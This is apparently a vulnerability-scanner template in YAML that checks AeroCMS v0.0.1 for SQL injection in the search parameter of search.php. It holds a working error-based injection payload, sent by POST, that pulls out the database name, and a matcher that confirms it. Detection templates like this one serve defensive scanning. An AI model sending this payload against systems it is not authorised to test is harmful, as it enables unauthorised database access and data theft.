expression: r0()
id: aero-cms-front-end-search-function-sql-Injection
info:
  author: daffainfo
  description: "AeroCMS v0.0.1\u53D1\u73B0\u53EF\u4EE5\u901A\u8FC7search.php\u6587\
    \u4EF6\u4E2D\u7684search\u53C2\u6570\u8FDB\u884Csql\u6CE8\u5165\u3002\u8BE5\u6F0F\
    \u6D1E\u5141\u8BB8\u653B\u51FB\u8005\u5728\u672A\u7ECF\u8EAB\u4EFD\u9A8C\u8BC1\
    \u7684\u60C5\u51B5\u4E0B\u83B7\u5F97\u6570\u636E\u5E93\u7BA1\u7406\u5458\u6743\
    \u9650\u5E76\u8BBF\u95EE\u6570\u636E\u5E93\u4FE1\u606F\u3002"
  name: "AeroCMS v0.0.1 \u524D\u7AEF\u641C\u7D22\u529F\u80FDsql\u6CE8\u5165\u6F0F\u6D1E"
  reference:
  - https://github.com/MegaTKC/AeroCMS/issues/8
  severity: high
  verified: false
rules:
  r0:
    expression: response.status == 200 &&  response.body.bcontains(b'~aerocms~')
    request:
      body: search=%1'and updatexml(1,concat(0x7e,database(),0x7e),0)#
      method: POST
      path: /search.php
